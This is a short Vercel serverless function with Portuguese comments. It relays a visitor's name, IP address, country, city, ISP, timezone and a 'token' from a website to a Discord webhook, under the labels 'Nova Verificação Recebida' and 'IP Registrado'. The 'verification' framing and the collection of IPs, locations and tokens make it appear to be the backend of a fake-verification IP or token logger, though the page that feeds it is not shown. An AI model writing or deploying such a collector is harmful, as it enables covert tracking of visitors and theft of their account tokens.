// api/register.js — Vercel Function
// Recebe dados do site e manda pro webhook do Discord

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).end();

  const { name, ip, country, city, isp, date, timezone, token } = req.body;
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookUrl) return res.status(500).json({ error: 'Webhook não configurado' });

  const embed = {
    embeds: [{
      title: '🔔 Nova Verificação Recebida',
      color: 0x63b3ed,
      fields: [
        { name: '📛 Nome',       value: `\`${name     || 'N/A'}\``, inline: true },
        { name: '🌐 IP',         value: `\`${ip       || 'N/A'}\``, inline: true },
        { name: '📅 Data/Hora',  value: `\`${date     || 'N/A'}\``, inline: true },
        { name: '🌍 País',       value: `\`${country  || 'N/A'}\``, inline: true },
        { name: '🏙️ Cidade',    value: `\`${city     || 'N/A'}\``, inline: true },
        { name: '📡 ISP',        value: `\`${isp      || 'N/A'}\``, inline: true },
        { name: '🖥️ Timezone',  value: `\`${timezone || 'N/A'}\``, inline: true },
        { name: '🔑 Token',      value: `\`${token    || 'N/A'}\``, inline: true },
      ],
      footer: { text: 'Verificação Automática • IP Registrado' },
      timestamp: new Date().toISOString(),
    }]
  };

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embed),
  });

  return res.status(200).json({ success: true });
}
